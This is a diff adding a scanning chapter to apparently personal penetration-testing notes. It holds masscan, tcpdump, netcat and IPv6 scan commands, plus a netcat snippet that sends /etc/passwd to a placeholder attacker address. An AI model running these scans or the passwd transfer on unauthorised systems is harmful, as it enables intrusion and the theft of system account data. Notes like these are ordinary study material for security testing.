@@ -11,10 +11,37 @@ exfiltool
 
 
 
-# Chapter 2
+# Chapter 2 Scanning
 
+## Nmap
 
+## Other Scanning tools   
+```
+masscan -0-65535 --rate 1500 10.10.10.0/24
+```
+```
+tcpdump -nnX tcp and dst 10.10.10.10
+tcpdump -nn udp and src 10.10.10.10
+tcpdump -nn tcp and port 80 and host 10.10.10.10
+```
+```
+echo "" | nc -nvw2 10.10.10.60 20-80
+```
 
+### IPv6 scans
+
+multicast scan   
+```
+ping6 -I eth0 ff02::1
+```   
+### Netcat
+
+Transfer files
+```
+nc -nvlp 8080 < /etc/passwd
+
+nc -nv YOUR_LINUX_IP_ADDRESS 8080 > passwd.txt
+```
 
 # Chapter 5
 
